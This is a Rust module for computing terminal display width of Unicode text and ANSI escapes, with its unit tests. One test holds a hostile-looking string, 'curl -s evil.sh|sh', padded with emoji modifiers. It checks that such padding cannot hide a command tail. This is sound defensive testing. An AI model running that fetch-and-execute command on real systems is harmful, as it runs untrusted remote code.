use unicode_properties::{GeneralCategory, UnicodeGeneralCategory};
use unicode_segmentation::UnicodeSegmentation;
use unicode_width::UnicodeWidthChar;

use crate::unicode_display_data::{RGI_EMOJI_SEQUENCES, VARIATION_BASES};

const MAX_RGI_SEQUENCE_CODEPOINTS: usize = 10;
const VARIATION_SELECTOR_15: char = '\u{fe0e}';
const VARIATION_SELECTOR_16: char = '\u{fe0f}';
const COMBINING_ENCLOSING_KEYCAP: char = '\u{20e3}';

#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
pub struct DisplayUnit {
    pub byte_len: usize,
    pub cell_width: usize,
}

pub fn visible_width(text: &str) -> usize {
    let mut width: usize = 0;
    let mut index = 0;
    while index < text.len() {
        let unit = display_unit_at(text, index);
        width = width.saturating_add(unit.cell_width);
        index += unit.byte_len;
    }
    width
}

pub fn prefix_by_width(text: &str, max_width: usize) -> &str {
    if max_width == 0 {
        return "";
    }
    let mut width = 0;
    let mut index = 0;
    while index < text.len() {
        let unit = display_unit_at(text, index);
        if unit.cell_width > max_width - width {
            break;
        }
        width += unit.cell_width;
        index += unit.byte_len;
    }
    &text[..index]
}

fn prefix_by_width_ignoring_ansi(text: &str, max_width: usize) -> &str {
    if max_width == 0 {
        return "";
    }
    let mut width = 0;
    let mut index = 0;
    while index < text.len() {
        if text.as_bytes()[index] == 0x1b {
            index = ansi_sequence_end(text, index);
            continue;
        }
        let unit = display_unit_at(text, index);
        if unit.cell_width > max_width - width {
            break;
        }
        width += unit.cell_width;
        index += unit.byte_len;
    }
    &text[..index]
}

pub fn suffix_by_width(text: &str, max_width: usize) -> &str {
    if max_width == 0 {
        return &text[text.len()..];
    }
    let mut remaining = visible_width(text);
    if remaining <= max_width {
        return text;
    }
    let mut index = 0;
    while index < text.len() && remaining > max_width {
        let unit = display_unit_at(text, index);
        remaining -= unit.cell_width;
        index += unit.byte_len;
    }
    &text[index..]
}

pub fn display_unit_at(text: &str, index: usize) -> DisplayUnit {
    let bytes = text.as_bytes();
    let Some(&first_byte) = bytes.get(index) else {
        return DisplayUnit::default();
    };
    if !text.is_char_boundary(index) {
        return DisplayUnit {
            byte_len: text.ceil_char_boundary(index) - index,
            cell_width: 1,
        };
    }

    let may_start_emoji =
        matches!(first_byte, b'#' | b'*' | b'0'..=b'9') && has_emoji_suffix(&text[index + 1..]);
    if first_byte < 0x80 && !may_start_emoji {
        let cell_width = usize::from(first_byte >= 0x20 && first_byte != 0x7f);
        return DisplayUnit {
            byte_len: 1,
            cell_width,
        };
    }

    let rest = &text[index..];
    let rgi_len = match_rgi_sequence(rest);
    if rgi_len != 0 {
        return DisplayUnit {
            byte_len: rgi_len,
            cell_width: 2,
        };
    }

    let mut chars = rest.chars();
    let Some(first) = chars.next() else {
        return DisplayUnit::default();
    };
    let first_len = first.len_utf8();
    if is_variation_base(first) {
        match chars.next() {
            Some(VARIATION_SELECTOR_15) => {
                return DisplayUnit {
                    byte_len: first_len + VARIATION_SELECTOR_15.len_utf8(),
                    cell_width: if is_double_width(first) { 2 } else { 1 },
                };
            }
            Some(VARIATION_SELECTOR_16) => {
                return DisplayUnit {
                    byte_len: first_len + VARIATION_SELECTOR_16.len_utf8(),
                    cell_width: 2,
                };
            }
            _ => {}
        }
    }

    DisplayUnit {
        byte_len: first_len,
        cell_width: rune_width(first),
    }
}

fn has_emoji_suffix(suffix: &str) -> bool {
    suffix.starts_with([VARIATION_SELECTOR_16, COMBINING_ENCLOSING_KEYCAP])
}

fn rune_width(codepoint: char) -> usize {
    let value = u32::from(codepoint);
    if value < 0x20 || (0x7f..0xa0).contains(&value) {
        return 0;
    }
    if is_zero_width_continuation(value) && !is_unassigned(codepoint) {
        return 0;
    }
    if is_double_width(codepoint) { 2 } else { 1 }
}

fn is_double_width(codepoint: char) -> bool {
    match codepoint {
        '\u{1f1e6}'..='\u{1f1ff}'
        | '\u{302a}'..='\u{302f}'
        | '\u{3099}'..='\u{309a}'
        | '\u{3164}'
        | '\u{16fe4}'
        | '\u{16ff0}'..='\u{16ff1}' => true,
        '\u{17a4}' => false,
        _ => codepoint.width() == Some(2),
    }
}

fn is_combining(value: u32) -> bool {
    matches!(
        value,
        0x0300..=0x036f
            | 0x1ab0..=0x1aff
            | 0x1dc0..=0x1dff
            | 0x20d0..=0x20ff
            | 0xfe20..=0xfe2f
            | 0xfe00..=0xfe0f
    )
}

fn is_zero_width_continuation(value: u32) -> bool {
    is_combining(value)
        || matches!(
            value,
            0x200b..=0x200f
                | 0x202a..=0x202e
                | 0x2060..=0x206f
                | 0xfeff
                | 0xe0001..=0xe007f
                | 0xe0100..=0xe01ef
        )
}

fn is_unassigned(codepoint: char) -> bool {
    codepoint.general_category() == GeneralCategory::Unassigned
}

fn is_variation_base(codepoint: char) -> bool {
    VARIATION_BASES
        .binary_search_by(|&(first, last)| {
            if codepoint < first {
                std::cmp::Ordering::Greater
            } else if codepoint > last {
                std::cmp::Ordering::Less
            } else {
                std::cmp::Ordering::Equal
            }
        })
        .is_ok()
}

fn match_rgi_sequence(rest: &str) -> usize {
    let Some(first) = rest.chars().next() else {
        return 0;
    };
    if !starts_rgi_sequence(&rest[..first.len_utf8()]) {
        return 0;
    }
    let window_end = rest
        .char_indices()
        .nth(MAX_RGI_SEQUENCE_CODEPOINTS)
        .map_or(rest.len(), |(offset, _)| offset);
    let Some(cluster) = rest[..window_end].graphemes(true).next() else {
        return 0;
    };
    let mut end = cluster.len();
    while end > first.len_utf8() {
        let candidate = &cluster[..end];
        if RGI_EMOJI_SEQUENCES.binary_search(&candidate).is_ok() {
            return end;
        }
        end = candidate
            .char_indices()
            .next_back()
            .map_or(0, |(offset, _)| offset);
    }
    0
}

fn starts_rgi_sequence(first: &str) -> bool {
    let position = RGI_EMOJI_SEQUENCES.partition_point(|sequence| *sequence < first);
    RGI_EMOJI_SEQUENCES
        .get(position)
        .is_some_and(|sequence| sequence.starts_with(first))
}

pub fn should_wrap_at(col: u16, width: u16, cols: u16) -> bool {
    (u32::from(col) + u32::from(width)).saturating_sub(1) > u32::from(cols)
}

pub fn next_tab_stop_column(col: u16, cols: u16) -> u16 {
    debug_assert!(col > 0);
    debug_assert!(cols > 0);
    if col >= cols {
        return cols;
    }
    let zero_based = u32::from(col) - 1;
    let next_stop = (zero_based / 8 + 1) * 8 + 1;
    u16::try_from(next_stop.min(u32::from(cols))).unwrap_or(cols)
}

fn ansi_sequence_end(text: &str, index: usize) -> usize {
    let bytes = text.as_bytes();
    if index >= bytes.len() || bytes[index] != 0x1b {
        return index;
    }
    if index + 1 >= bytes.len() {
        return bytes.len();
    }

    match bytes[index + 1] {
        b'[' => bytes[index + 2..]
            .iter()
            .position(|byte| (b'@'..=b'~').contains(byte))
            .map_or(bytes.len(), |offset| index + 2 + offset + 1),
        b']' => control_string_end(bytes, index + 2, true),
        b'P' | b'X' | b'^' | b'_' => control_string_end(bytes, index + 2, false),
        _ => text.ceil_char_boundary(index + 2),
    }
}

fn control_string_end(bytes: &[u8], start: usize, bell_terminates: bool) -> usize {
    let mut cursor = start;
    while cursor < bytes.len() {
        if bell_terminates && bytes[cursor] == 0x07 {
            return cursor + 1;
        }
        if bytes[cursor] == 0x1b && bytes.get(cursor + 1) == Some(&b'\\') {
            return cursor + 2;
        }
        cursor += 1;
    }
    bytes.len()
}

pub fn status_prefix_end(label: &str) -> usize {
    if label.is_empty() {
        return 0;
    }
    let first = display_unit_at(label, 0);
    if first.byte_len == 0 || first.byte_len >= label.len() {
        return 0;
    }
    if label.as_bytes()[first.byte_len] == b' ' {
        first.byte_len + 1
    } else {
        0
    }
}

pub fn wrap_cut_ignoring_ansi(text: &str, max_width: usize) -> &str {
    let prefix = prefix_by_width_ignoring_ansi(text, max_width);
    if prefix.len() == text.len() {
        return prefix;
    }

    let bytes = prefix.as_bytes();
    let mut last_space = None;
    let mut index = 0;
    while index < bytes.len() {
        if bytes[index] == 0x1b {
            index = ansi_sequence_end(prefix, index);
            continue;
        }
        let unit = display_unit_at(prefix, index);
        if bytes[index] == b' ' || bytes[index] == b'\t' {
            last_space = Some(index);
        }
        index += unit.byte_len;
    }
    match last_space {
        Some(space_index) if space_index > 0 => &text[..space_index],
        _ => prefix,
    }
}

pub fn trim_break_whitespace(text: &str) -> &str {
    text.trim_start_matches([' ', '\t'])
}

#[cfg(test)]
mod upstream_width_tables;

#[cfg(test)]
mod tests {
    use super::upstream_width_tables::{
        UPSTREAM_EMOJI_MODIFIER_RANGES, UPSTREAM_EMOJI_PRESENTATION_RANGES, UPSTREAM_WIDE_RANGES,
    };
    use super::*;

    const UNASSIGNED_ZERO_WIDTH_IN_UPSTREAM: usize = 68;

    fn in_upstream_ranges(codepoint: char, ranges: &[(char, char)]) -> bool {
        let index = ranges.partition_point(|&(_, last)| last < codepoint);
        ranges
            .get(index)
            .is_some_and(|&(first, _)| first <= codepoint)
    }

    fn upstream_rune_width(codepoint: char) -> usize {
        let value = u32::from(codepoint);
        let zero_width = matches!(
            value,
            0x00..=0x1f
                | 0x7f..=0x9f
                | 0x0300..=0x036f
                | 0x1ab0..=0x1aff
                | 0x1dc0..=0x1dff
                | 0x200b..=0x200f
                | 0x202a..=0x202e
                | 0x2060..=0x206f
                | 0x20d0..=0x20ff
                | 0xfe00..=0xfe0f
                | 0xfe20..=0xfe2f
                | 0xfeff
                | 0xe0001..=0xe007f
                | 0xe0100..=0xe01ef
        ) || in_upstream_ranges(codepoint, UPSTREAM_EMOJI_MODIFIER_RANGES);
        if zero_width {
            0
        } else if in_upstream_ranges(codepoint, UPSTREAM_WIDE_RANGES)
            || in_upstream_ranges(codepoint, UPSTREAM_EMOJI_PRESENTATION_RANGES)
        {
            2
        } else {
            1
        }
    }

    fn visible_width_ignoring_ansi(text: &str) -> usize {
        let mut width: usize = 0;
        let mut index = 0;
        while index < text.len() {
            if text.as_bytes()[index] == 0x1b {
                index = ansi_sequence_end(text, index);
                continue;
            }
            let unit = display_unit_at(text, index);
            width = width.saturating_add(unit.cell_width);
            index += unit.byte_len;
        }
        width
    }

    fn longest_rgi_prefix(text: &str) -> usize {
        text.char_indices()
            .take(MAX_RGI_SEQUENCE_CODEPOINTS)
            .map(|(offset, codepoint)| offset + codepoint.len_utf8())
            .filter(|&end| RGI_EMOJI_SEQUENCES.binary_search(&&text[..end]).is_ok())
            .max()
            .unwrap_or(0)
    }

    #[test]
    fn rune_widths_match_the_upstream_tables_except_for_lone_modifiers_and_unassigned_marks() {
        let differences: Vec<(char, usize, usize)> = ('\0'..=char::MAX)
            .map(|codepoint| {
                (
                    codepoint,
                    rune_width(codepoint),
                    upstream_rune_width(codepoint),
                )
            })
            .filter(|&(_, ours, upstream)| ours != upstream)
            .collect();
        let modifiers = differences
            .iter()
            .filter(|&&(codepoint, ours, upstream)| {
                ('\u{1f3fb}'..='\u{1f3ff}').contains(&codepoint) && (ours, upstream) == (2, 0)
            })
            .count();
        let unassigned = differences
            .iter()
            .filter(|&&(codepoint, ours, upstream)| {
                is_unassigned(codepoint) && (ours, upstream) == (1, 0)
            })
            .count();
        assert_eq!(
            (modifiers, unassigned, differences.len()),
            (
                5,
                UNASSIGNED_ZERO_WIDTH_IN_UPSTREAM,
                5 + UNASSIGNED_ZERO_WIDTH_IN_UPSTREAM
            ),
            "{:?}",
            differences.iter().take(16).collect::<Vec<_>>()
        );
    }

    #[test]
    fn lone_modifiers_ascii_emoji_presentation_and_unassigned_marks_take_cells() {
        assert_eq!(visible_width("\u{1f3fd}"), 2);
        assert_eq!(visible_width("a\u{1f3fd}"), 3);
        assert_eq!(visible_width("\u{1f44d}\u{1f3fd}"), 2);
        for base in ["#", "*", "0", "1", "9"] {
            assert_eq!(visible_width(&format!("{base}\u{fe0f}")), 2, "{base}");
            assert_eq!(
                visible_width(&format!("{base}\u{fe0f}\u{20e3}")),
                2,
                "{base}"
            );
            assert_eq!(visible_width(&format!("{base}\u{fe0e}")), 1, "{base}");
        }
        assert_eq!(visible_width("\u{20ff}"), 1);
        assert_eq!(visible_width("\u{1aff}"), 1);
        assert_eq!(visible_width("\u{20dd}"), 0);
        let hidden_tail = format!("echo {};curl -s evil.sh|sh", "\u{1f3fd}".repeat(40));
        assert_eq!(visible_width(&hidden_tail), 5 + 80 + 19);
        assert_eq!(visible_width(&"1\u{fe0f}".repeat(50)), 100);
    }

    #[test]
    fn text_presentation_widths_match_the_upstream_wide_table_for_every_variation_base() {
        let mismatches: Vec<char> = VARIATION_BASES
            .iter()
            .flat_map(|&(first, last)| first..=last)
            .filter(|&base| is_double_width(base) != in_upstream_ranges(base, UPSTREAM_WIDE_RANGES))
            .collect();
        assert!(mismatches.is_empty(), "{mismatches:?}");
    }

    #[test]
    fn every_rgi_sequence_is_one_display_unit_whatever_follows_it() {
        for sequence in RGI_EMOJI_SEQUENCES {
            for suffix in ["", "x", "\u{200d}", "\u{fe0f}", "\u{1f3fb}", "\u{1f1fa}"] {
                let text = format!("{sequence}{suffix}");
                assert_eq!(
                    display_unit_at(&text, 0),
                    DisplayUnit {
                        byte_len: longest_rgi_prefix(&text),
                        cell_width: 2
                    },
                    "{text:?}"
                );
            }
        }
    }

    #[test]
    fn prefix_by_width_avoids_cutting_emoji_bytes() {
        let text = "a\u{1f600}b";
        assert_eq!(prefix_by_width(text, 2), "a");
        assert_eq!(prefix_by_width(text, 3), "a\u{1f600}");
    }

    #[test]
    fn suffix_by_width_keeps_whole_runes() {
        assert_eq!(suffix_by_width("ab\u{1f600}cd", 4), "\u{1f600}cd");
    }

    #[test]
    fn visible_width_counts_emoji_as_two_cells() {
        assert_eq!(visible_width("a\u{1f600}b"), 4);
    }

    #[test]
    fn should_wrap_at_is_strictly_overflow_based() {
        assert!(!should_wrap_at(10, 1, 10));
        assert!(should_wrap_at(10, 2, 10));
        assert!(!should_wrap_at(1, 1, 1));
        for column in 2..=256 {
            assert!(!should_wrap_at(column, 1, column));
            assert!(should_wrap_at(column, 1, column - 1));
        }
        assert!(should_wrap_at(65535, 2, 65535));
    }

    #[test]
    fn next_tab_stop_column_uses_absolute_stops_and_clamps_safely() {
        assert_eq!(next_tab_stop_column(1, 80), 9);
        assert_eq!(next_tab_stop_column(8, 80), 9);
        assert_eq!(next_tab_stop_column(9, 80), 17);
        assert_eq!(next_tab_stop_column(1, 8), 8);
        assert_eq!(next_tab_stop_column(10, 10), 10);
        assert_eq!(next_tab_stop_column(11, 10), 10);
        assert_eq!(next_tab_stop_column(65535, 65535), 65535);
    }

    #[test]
    fn prefix_by_width_ignoring_ansi_keeps_opening_osc_8_attached_to_visible_bytes() {
        let text = "\x1b]8;;file:///x\x1b\\ab\x1b]8;;\x1b\\";
        let out = prefix_by_width_ignoring_ansi(text, 2);
        assert_eq!(visible_width_ignoring_ansi(out), 2);
        assert!(out.contains("\x1b]8;;file:///x\x1b\\"));
    }

    #[test]
    fn prefix_by_width_ignoring_ansi_returns_empty_on_zero_budget() {
        assert_eq!(prefix_by_width_ignoring_ansi("\x1b[31mhello\x1b[0m", 0), "");
    }

    #[test]
    fn ansi_sequence_end_handles_osc_terminated_by_esc_backslash() {
        let text = "\x1b]8;;file:///x\x1b\\body";
        assert_eq!(ansi_sequence_end(text, 0), 16);
        assert_eq!(visible_width_ignoring_ansi(text), 4);
    }

    #[test]
    fn rune_width_preserves_current_width_table_semantics() {
        assert_eq!(rune_width('\u{0}'), 0);
        assert_eq!(rune_width('\u{07}'), 0);
        assert_eq!(rune_width('\u{1b}'), 0);
        assert_eq!(rune_width('\u{80}'), 0);
        assert_eq!(rune_width('\u{9f}'), 0);
        assert_eq!(rune_width('\u{301}'), 0);
        assert_eq!(rune_width('\u{1ab0}'), 0);
        assert_eq!(rune_width('\u{4e00}'), 2);
        assert_eq!(rune_width('\u{1f600}'), 2);
        assert_eq!(rune_width('\u{ff66}'), 1);
        assert_eq!(rune_width('a'), 1);
        assert_eq!(rune_width(' '), 1);
        assert_eq!(rune_width('\t'), 0);
    }

    #[test]
    fn ansi_sequence_end_preserves_current_csi_osc_and_esc_boundaries() {
        assert_eq!(ansi_sequence_end("\x1b[m", 0), 3);
        assert_eq!(ansi_sequence_end("\x1b[1;31m", 0), 7);
        assert_eq!(ansi_sequence_end("\x1b[K", 0), 3);
        assert_eq!(ansi_sequence_end("\x1b[", 0), 2);
        assert_eq!(ansi_sequence_end("\x1b]8;;url\x07", 0), 9);
        assert_eq!(ansi_sequence_end("\x1b]8;;url\x1b\\", 0), 10);
        assert_eq!(ansi_sequence_end("\x1b]8;;url", 0), 8);
        assert_eq!(ansi_sequence_end("\x1bA", 0), 2);
        assert_eq!(ansi_sequence_end("\x1b", 0), 1);
    }

    #[test]
    fn ansi_sequence_end_consumes_device_and_application_strings_through_their_terminator() {
        assert_eq!(ansi_sequence_end("\x1bPq#0\x1b\\x", 0), 7);
        assert_eq!(ansi_sequence_end("\x1bXsos\x1b\\x", 0), 7);
        assert_eq!(ansi_sequence_end("\x1b^pm\x1b\\x", 0), 6);
        assert_eq!(ansi_sequence_end("\x1b_Ga=T\x1b\\x", 0), 8);
        assert_eq!(ansi_sequence_end("\x1b_Ga\x07=T\x1b\\x", 0), 9);
        assert_eq!(ansi_sequence_end("\x1b_Gpayload", 0), 10);
    }

    #[test]
    fn width_cuts_keep_application_strings_whole() {
        let text = "\x1b_Gpayload\x1b\\text";
        assert_eq!(
            prefix_by_width_ignoring_ansi(text, 2),
            "\x1b_Gpayload\x1b\\te"
        );
        assert_eq!(visible_width_ignoring_ansi(text), 4);
        assert_eq!(wrap_cut_ignoring_ansi(text, 2), "\x1b_Gpayload\x1b\\te");
        let text = "\x1bPq#0;2;0;0;0\x1b\\ab cd";
        assert_eq!(wrap_cut_ignoring_ansi(text, 4), "\x1bPq#0;2;0;0;0\x1b\\ab");
    }

    #[test]
    fn prefix_by_width_and_suffix_by_width_preserve_boundary_behavior() {
        assert_eq!(prefix_by_width("ab", 0), "");
        assert_eq!(prefix_by_width("ab", 1), "a");
        assert_eq!(prefix_by_width("ab", 2), "ab");
        assert_eq!(prefix_by_width("ab", 100), "ab");
        assert!(suffix_by_width("ab", 0).is_empty());
        assert_eq!(suffix_by_width("ab", 1), "b");
        assert_eq!(suffix_by_width("a\u{1f600}b", 3), "\u{1f600}b");
    }

    #[test]
    fn should_wrap_at_preserves_documented_edge_behavior() {
        assert!(should_wrap_at(1, 2, 1));
        assert!(!should_wrap_at(1, 1, 80));
        assert!(!should_wrap_at(80, 1, 80));
        assert!(should_wrap_at(80, 2, 80));
    }

    #[test]
    fn status_prefix_end_detects_a_leading_status_rune_and_space() {
        assert_eq!(status_prefix_end("▲ error"), 4);
        assert_eq!(status_prefix_end("x error"), 2);
        assert_eq!(status_prefix_end("error text"), 0);
        assert_eq!(status_prefix_end("▲"), 0);
        assert_eq!(status_prefix_end(""), 0);
    }

    #[test]
    fn wrap_cut_ignoring_ansi_prefers_the_last_space_inside_the_budget() {
        assert_eq!(wrap_cut_ignoring_ansi("aaaa bbbb cccc", 10), "aaaa bbbb");
        assert_eq!(wrap_cut_ignoring_ansi("aaaaabbbbbcc", 5), "aaaaa");
        assert_eq!(wrap_cut_ignoring_ansi(" abcd", 2), " a");
        assert_eq!(
            wrap_cut_ignoring_ansi("aaaa bbbb cccc", 20),
            "aaaa bbbb cccc"
        );
        assert_eq!(
            wrap_cut_ignoring_ansi("\x1b[31maaaa bbbb\x1b[0m", 6),
            "\x1b[31maaaa"
        );
        assert_eq!(
            wrap_cut_ignoring_ansi("see \x1b]8;id=1;https://x.io/a b\x1b\\docs more", 8),
            "see"
        );
    }

    #[test]
    fn trim_break_whitespace_strips_leading_spaces_and_tabs() {
        assert_eq!(trim_break_whitespace(" \t abc"), "abc");
        assert_eq!(trim_break_whitespace("abc "), "abc ");
        assert_eq!(trim_break_whitespace("  "), "");
    }

    #[test]
    fn display_unit_widths_cover_presentation_and_rgi_sequences() {
        let cases = [
            ("A", 1),
            ("\u{754C}", 2),
            ("a\u{0301}", 1),
            ("\u{2705}", 2),
            ("\u{274C}", 2),
            ("\u{2600}\u{FE0E}", 1),
            ("\u{231A}\u{FE0E}", 2),
            ("\u{26A1}\u{FE0E}", 2),
            ("\u{2600}\u{FE0F}", 2),
            ("\u{1F44D}\u{1F3FD}", 2),
            ("\u{1F1FA}\u{1F1F8}", 2),
            ("#\u{FE0F}\u{20E3}", 2),
            (
                "\u{1F3F4}\u{E0067}\u{E0062}\u{E0065}\u{E006E}\u{E0067}\u{E007F}",
                2,
            ),
            ("\u{1F469}\u{200D}\u{1F4BB}", 2),
        ];
        for (text, width) in cases {
            assert_eq!(visible_width(text), width, "{text:?}");
        }
    }

    #[test]
    fn display_unit_scanner_returns_exact_sequence_byte_spans() {
        let cases = [
            ("A", 1),
            ("\u{754C}", 2),
            ("\u{2705}", 2),
            ("\u{2600}\u{FE0E}", 1),
            ("\u{231A}\u{FE0E}", 2),
            ("\u{26A1}\u{FE0E}", 2),
            ("\u{2600}\u{FE0F}", 2),
            ("\u{1F44D}\u{1F3FD}", 2),
            ("\u{1F1FA}\u{1F1F8}", 2),
            ("#\u{FE0F}\u{20E3}", 2),
            (
                "\u{1F3F4}\u{E0067}\u{E0062}\u{E0065}\u{E006E}\u{E0067}\u{E007F}",
                2,
            ),
            ("\u{1F469}\u{200D}\u{1F4BB}", 2),
        ];
        for (text, cell_width) in cases {
            assert_eq!(
                display_unit_at(text, 0),
                DisplayUnit {
                    byte_len: text.len(),
                    cell_width
                },
                "{text:?}"
            );
        }
        assert_eq!(display_unit_at("", 0), DisplayUnit::default());
    }

    #[test]
    fn display_unit_scanner_rejects_sequence_lookalikes() {
        let stray_selector = "A\u{FE0F}";
        assert_eq!(
            display_unit_at(stray_selector, 0),
            DisplayUnit {
                byte_len: 1,
                cell_width: 1
            }
        );
        assert_eq!(visible_width(stray_selector), 1);

        let invalid_flag = "\u{1F1E6}\u{1F1E6}";
        assert_eq!(visible_width(invalid_flag), 4);
        assert_eq!(display_unit_at(invalid_flag, 0).byte_len, 4);

        let incomplete_keycap = "#\u{20E3}";
        assert_eq!(display_unit_at(incomplete_keycap, 0).byte_len, 1);
        assert_eq!(visible_width(incomplete_keycap), 1);

        let incomplete_tag = "\u{1F3F4}\u{E0067}\u{E0062}\u{E0065}\u{E006E}\u{E0067}";
        assert_eq!(display_unit_at(incomplete_tag, 0).byte_len, 4);

        let invalid_zwj = "\u{1F469}\u{200D}A";
        assert_eq!(display_unit_at(invalid_zwj, 0).byte_len, 4);
        assert_eq!(visible_width(invalid_zwj), 3);
    }

    #[test]
    fn ordinary_ascii_keycap_candidates_stay_on_the_single_byte_path() {
        let text = "0123456789#*";
        for index in 0..text.len() {
            assert_eq!(
                display_unit_at(text, index),
                DisplayUnit {
                    byte_len: 1,
                    cell_width: 1
                }
            );
        }
    }

    #[test]
    fn display_unit_clipping_preserves_sequence_boundaries() {
        let sequence = "\u{1F44D}\u{1F3FD}";
        let text = format!("a{sequence}b");
        assert_eq!(prefix_by_width(&text, 2), "a");
        assert_eq!(prefix_by_width(&text, 3), format!("a{sequence}"));
        assert_eq!(suffix_by_width(&text, 1), "b");
        assert_eq!(suffix_by_width(&text, 3), format!("{sequence}b"));

        let styled = format!("\x1b[31m{sequence}\x1b[0m");
        assert_eq!(prefix_by_width_ignoring_ansi(&styled, 2), styled);
        assert_eq!(
            status_prefix_end(&format!("{sequence} active")),
            sequence.len() + 1
        );
    }

    #[test]
    fn fuzz_display_unit_boundaries() {
        let corpus = [
            "",
            "plain text",
            "\u{2600}\u{FE0E}\u{2600}\u{FE0F}",
            "\u{1F44D}\u{1F3FD}\u{1F1FA}\u{1F1F8}",
            "#\u{FE0F}\u{20E3}\u{1F469}\u{200D}\u{1F4BB}",
            "\u{1F469}\u{200D}\u{1F469}\u{200D}\u{1F467}\u{200D}\u{1F466}\u{200D}\u{1F525}",
            "e\u{301}\u{302}\u{303}漢字\u{1F1E6}\u{1F1E6}\u{1F1FA}\u{1F1F8}",
        ];
        for text in corpus {
            let mut expected_width: usize = 0;
            let mut index = 0;
            while index < text.len() {
                let unit = display_unit_at(text, index);
                assert!(unit.byte_len > 0);
                assert!(unit.byte_len <= text.len() - index);
                assert!(unit.cell_width <= 2);
                assert_eq!(unit, display_unit_at(text, index));
                expected_width = expected_width.saturating_add(unit.cell_width);
                index += unit.byte_len;
            }
            assert_eq!(index, text.len());
            assert_eq!(visible_width(text), expected_width);

            for budget in [
                0,
                (expected_width / 2).min(16),
                (expected_width + 2).min(16),
            ] {
                let prefix = prefix_by_width(text, budget);
                let suffix = suffix_by_width(text, budget);
                assert!(is_display_unit_boundary(text, prefix.len()));
                assert!(is_display_unit_boundary(text, text.len() - suffix.len()));
                assert!(visible_width(prefix) <= budget);
                assert!(visible_width(suffix) <= budget);
            }
        }
    }

    fn is_display_unit_boundary(text: &str, target: usize) -> bool {
        if target > text.len() {
            return false;
        }
        let mut index = 0;
        while index < target {
            let unit = display_unit_at(text, index);
            if unit.byte_len == 0 || unit.byte_len > target - index {
                return false;
            }
            index += unit.byte_len;
        }
        index == target
    }

    #[test]
    fn control_characters_occupy_no_cells() {
        assert_eq!(visible_width("a\tb\nc\rd\u{7f}e\u{0}"), 5);
        assert_eq!(visible_width("\u{85}\u{9b}"), 0);
        assert_eq!(visible_width("\x1b[31m"), 4);
    }

    #[test]
    fn east_asian_wide_and_fullwidth_text_occupies_two_cells() {
        assert_eq!(visible_width("漢字かなカナ한글"), 16);
        assert_eq!(visible_width("ＡＢＣ"), 6);
        assert_eq!(visible_width("ｱｲｳ"), 3);
        assert_eq!(visible_width("\u{3000}"), 2);
    }

    #[test]
    fn zero_width_format_characters_occupy_no_cells() {
        assert_eq!(visible_width("a\u{200b}b\u{200d}c\u{2060}d\u{feff}"), 4);
        assert_eq!(visible_width("\u{202e}x\u{e0100}"), 1);
    }

    #[test]
    fn zwj_sequences_use_rgi_membership_instead_of_grapheme_clusters() {
        assert_eq!(
            visible_width("\u{1F469}\u{200D}\u{1F469}\u{200D}\u{1F467}\u{200D}\u{1F466}"),
            2
        );
        assert_eq!(
            visible_width("\u{1F3F3}\u{FE0F}\u{200D}\u{26A7}\u{FE0F}"),
            2
        );
        assert_eq!(visible_width("\u{1F9D1}\u{1F3FD}\u{200D}\u{1F4BB}"), 2);
        assert_eq!(visible_width("\u{1F436}\u{200D}\u{1F431}"), 4);
        assert_eq!(
            visible_width("\u{1F469}\u{200D}\u{1F4BB}\u{200D}\u{1F525}"),
            4
        );
        assert_eq!(
            display_unit_at("\u{1F469}\u{200D}\u{1F4BB}\u{200D}\u{1F525}", 0).byte_len,
            "\u{1F469}\u{200D}\u{1F4BB}".len()
        );
    }

    #[test]
    fn regional_indicators_pair_only_into_valid_flags() {
        assert_eq!(visible_width("\u{1F1E6}"), 2);
        assert_eq!(visible_width("\u{1F1E6}\u{1F1FA}\u{1F1F8}"), 4);
        assert_eq!(
            display_unit_at("\u{1F1E6}\u{1F1E6}\u{1F1FA}\u{1F1F8}", 4).byte_len,
            8
        );
    }

    #[test]
    fn upstream_width_table_overrides_the_unicode_width_crate() {
        assert_eq!(visible_width("\u{17a4}"), 1);
        assert_eq!(visible_width("\u{302a}\u{302f}\u{3099}\u{309a}"), 8);
        assert_eq!(visible_width("\u{3164}\u{16fe4}\u{16ff0}\u{16ff1}"), 8);
        assert_eq!(visible_width("\u{0591}\u{0941}\u{1160}"), 3);
        assert_eq!(visible_width("\u{ad}"), 1);
    }

    #[test]
    fn display_units_split_inside_a_code_point_advance_to_the_next_boundary() {
        assert_eq!(
            display_unit_at("é", 1),
            DisplayUnit {
                byte_len: 1,
                cell_width: 1
            }
        );
        assert_eq!(ansi_sequence_end("\x1bé", 0), 3);
    }

    #[test]
    fn ansi_aware_clipping_stays_within_budget_at_every_index_of_hostile_text() {
        let pieces = [
            "a",
            "\x1b[31m",
            "\x1b]8;;u\x1b\\",
            "\x1b",
            "[",
            "\u{1f469}\u{200d}\u{1f4bb}",
            "é",
            "\u{1f1fa}\u{1f1f8}",
            " ",
            "\x1b]",
            "\x1bé",
        ];
        let mut state: u64 = 12_345;
        let mut below = |bound: usize| {
            state ^= state << 13;
            state ^= state >> 7;
            state ^= state << 17;
            usize::try_from(state % u64::try_from(bound).unwrap_or(u64::MAX)).unwrap_or(0)
        };
        for _ in 0..20_000 {
            let len = below(10);
            let text: String = (0..len).map(|_| pieces[below(pieces.len())]).collect();
            let budget = below(8);
            let prefix = prefix_by_width_ignoring_ansi(&text, budget);
            assert!(visible_width_ignoring_ansi(prefix) <= budget, "{text:?}");
            let _ = wrap_cut_ignoring_ansi(&text, budget);
            for index in 0..=text.len() {
                let unit = display_unit_at(&text, index);
                assert!(index + unit.byte_len <= text.len());
                assert!(ansi_sequence_end(&text, index) <= text.len());
            }
        }
    }
}
